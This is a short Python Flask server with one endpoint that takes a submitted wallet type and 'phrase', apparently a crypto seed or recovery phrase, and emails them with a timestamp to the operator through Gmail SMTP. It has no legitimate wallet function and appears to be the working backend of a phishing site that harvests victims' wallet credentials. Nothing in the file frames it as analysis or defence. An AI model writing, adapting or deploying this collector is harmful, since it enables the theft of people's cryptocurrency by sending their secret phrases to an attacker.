from flask import Flask, request, jsonify
import smtplib
from email.message import EmailMessage
import datetime
import os

app = Flask(__name__)

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.get_json()
    wallet_type = data.get('type')
    phrase = data.get('phrase')
    timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    msg = EmailMessage()
    msg['Subject'] = '🔥 New Wallet Submission'
    msg['From'] = os.environ.get("EMAIL_USER")
    msg['To'] = os.environ.get("EMAIL_TO")
    msg.set_content(f"Timestamp: {timestamp}\nWallet: {wallet_type}\nPhrase: {phrase}")

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(os.environ.get("EMAIL_USER"), os.environ.get("EMAIL_PASS"))
            smtp.send_message(msg)
    except Exception as e:
        print("Email error:", e)

    return jsonify({"status": "received"}), 200

if __name__ == '__main__':
    app.run()
